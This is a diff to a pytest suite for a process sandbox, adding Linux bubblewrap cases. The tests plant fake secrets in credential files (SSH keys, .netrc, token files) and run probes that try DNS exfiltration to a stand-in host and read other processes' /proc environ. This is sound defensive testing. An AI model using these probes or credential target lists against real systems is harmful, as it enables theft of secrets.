@@ -22,6 +22,7 @@ from ergostat.sandbox import Policy, bwrap, run, seatbelt
 from ergostat.sandbox.git import Repo, Tampered
 from ergostat.sandbox.proxy import Proxy
 
+LINUX = sys.platform.startswith("linux")     # bwrap; otherwise macOS's seatbelt. Where they differ, each has its form
 SECRET = f"FAKE-SECRET-{uuid.uuid4().hex}"
 PLANTED = ["jira_token", ".claude.json", ".claude/.credentials.json", ".ssh/id_rsa", ".ssh/config", ".netrc",
            ".config/gh/hosts.yml", ".config/some-token", ".zsh_history", ".bash_history", ".npmrc", ".pypirc",
@@ -177,7 +178,7 @@ def test_dns_is_denied_inside(box):
     port = listener.getsockname()[1]
     for hosts in ({}, {"allowed.example": None}):
         r = py(f"""
-            import socket
+            import os, socket
             try:
                 socket.getaddrinfo("exfil-{SECRET[-12:]}.example.com", 80); print("resolved")
             except OSError as e:
@@ -187,10 +188,19 @@ def test_dns_is_denied_inside(box):
                     socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"q", where); print("sent", where)
                 except OSError as e:
                     print("refused", e.errno)
+            try:
+                print("netns", os.readlink("/proc/self/ns/net"))
+            except OSError:
+                pass
             """, Policy(work=work, hosts=hosts))
-        assert "resolved" not in r.stdout and "sent" not in r.stdout, r.stdout
-        assert r.stdout.count("refused") == 2
-    with pytest.raises(socket.timeout):
+        assert "resolved" not in r.stdout and "no dns" in r.stdout, r.stdout
+        if LINUX:     # a network namespace of its own: no route out, and its 127.0.0.1 is its own loopback, not ours
+            assert "refused 101" in r.stdout and "sent ('192.0.2.1'" not in r.stdout, r.stdout     # ENETUNREACH
+            assert f"netns {os.readlink('/proc/self/ns/net')}" not in r.stdout and "netns net:[" in r.stdout, r.stdout
+        else:
+            assert "sent" not in r.stdout, r.stdout
+            assert r.stdout.count("refused") == 2
+    with pytest.raises(socket.timeout):        # nothing reached the listener outside, on either
         listener.recvfrom(10)
     listener.close()
 
@@ -501,10 +511,26 @@ for name, mib in (("procargs2", (1, 49, pid)), ("procargs", (1, 38, pid)), ("pro
 """
 
 
+# Linux: /proc in the sandbox is its pid namespace's: every process it shows, and what it can read of each. The markers
+# are split in the code so that the probe's own command line never holds them.
+PROCFS = """
+import os
+seen = [d for d in os.listdir("/proc") if d.isdigit()]
+def read(pid, what):
+    try:
+        return open(f"/proc/{pid}/{what}", "rb").read()
+    except OSError:
+        return b""
+print("pids", len(seen))
+print("proc.all", "LISTED" if any(b"FAKE-" + b"NEIGHBOUR" in read(d, "cmdline") for d in seen) else "denied")
+print("environ", "LEAKED" if any(b"FAKE-SECRET-" + b"procenv" in read(d, "environ") for d in seen) else "unread")
+"""
+
+
 @pytest.fixture
 def neighbour():
     """A process of the same user with a fake secret in its environment."""
-    p = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"],
+    p = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)", "FAKE-NEIGHBOUR"],
                          env={**os.environ, "FAKE_TOKEN": "FAKE-SECRET-procenv"})
     yield p.pid
     p.kill()
@@ -513,14 +539,25 @@ def neighbour():
 
 def test_the_process_list_is_denied(box, neighbour):
     home, work = box
+    if LINUX:     # the neighbour is outside its pid namespace: /proc shows only the run's own (bwrap's init, itself)
+        assert open(f"/proc/{neighbour}/cmdline", "rb").read().count(b"FAKE-NEIGHBOUR"), "the neighbour is there"
+        r = run([sys.executable, "-c", PROCFS], Policy(work=work))
+        assert "proc.all denied" in r.stdout and "pids 2" in r.stdout, r.stdout + r.stderr
+        return
     r = run([sys.executable, "-c", PROCARGS, str(neighbour)], Policy(work=work))
     assert "proc.all denied" in r.stdout, r.stdout + r.stderr
 
 
-@pytest.mark.xfail(strict=True, reason="macOS's sandbox does not mediate KERN_PROCARGS2 for the same user: another "
-                   "process's argv and environment stay readable (docs/SECURITY.md); a separate uid would close it")
+@pytest.mark.xfail(not LINUX, strict=True, reason="macOS's sandbox does not mediate KERN_PROCARGS2 for the same user: "
+                   "another process's argv and environment stay readable (docs/SECURITY.md); a separate uid would close "
+                   "it. Linux's pid namespace hides every other process, so there it holds")
 def test_another_processes_environment_is_unreadable(box, neighbour):
     home, work = box
+    if LINUX:
+        assert b"FAKE-SECRET-procenv" in open(f"/proc/{neighbour}/environ", "rb").read(), "readable outside"
+        r = run([sys.executable, "-c", PROCFS], Policy(work=work))
+        assert "environ unread" in r.stdout, r.stdout + r.stderr
+        return
     r = run([sys.executable, "-c", PROCARGS, str(neighbour)], Policy(work=work))
     assert "LEAKED" not in r.stdout
 
@@ -554,7 +591,10 @@ def test_a_pid_hopping_process_does_not_outlive_the_run(box, supervisor):
     import time
     time.sleep(1)
     assert alive.stat().st_mtime == before, "the hopper outlived the run"
-    assert r.escaped == [] and (r.exit == 0 if supervisor == "kept" else r.exit is None)
+    if LINUX:     # its parent is bwrap's init, pid 1 of the run's namespace, which a signal from inside never ends:
+        assert r.escaped == [] and r.exit == 0, (r.exit, r.stderr)     # the program's own exit, either way
+    else:         # ergostat's supervisor, killed: no exit reported
+        assert r.escaped == [] and (r.exit == 0 if supervisor == "kept" else r.exit is None)
 
 
 def _hello(name: str) -> bytes:
@@ -641,11 +681,22 @@ def test_the_toolchain_is_the_interpreters_own_folders_never_a_whole_prefix(box,
         import os
         for d in ({os.path.realpath(sys.base_prefix)!r}, {os.path.dirname(os.path.realpath(sys.prefix))!r}):
             try:
-                print("LISTED", d, len(os.listdir(d)))
+                print("LISTED", d, len(os.listdir(d)), *sorted(os.listdir(d)))
             except OSError:
                 print("denied")
         """, Policy(work=work))
-    assert r.stdout.count("denied") == 2, r.stdout
+    if not LINUX:
+        assert r.stdout.count("denied") == 2, r.stdout
+        return
+    # bwrap's root is empty: a prefix shows only the folders it made to mount what is allowed, never the rest of it
+    allowed = [os.path.realpath(p) for p in [*reads, *libs]]
+    listed = [line.split()[1:] for line in r.stdout.splitlines() if line.startswith("LISTED")]
+    assert len(listed) + r.stdout.count("denied") == 2, r.stdout
+    for d, _n, *names in listed:
+        assert int(_n) == len(names)
+        for name in names:
+            p = os.path.join(d, name)
+            assert any(a == p or a.startswith(p + "/") or p.startswith(a + "/") for a in allowed), (p, r.stdout)
     for bad in (Path.home(), Path("/")):
         with pytest.raises(ValueError):
             run(["/bin/true"], Policy(work=bad))
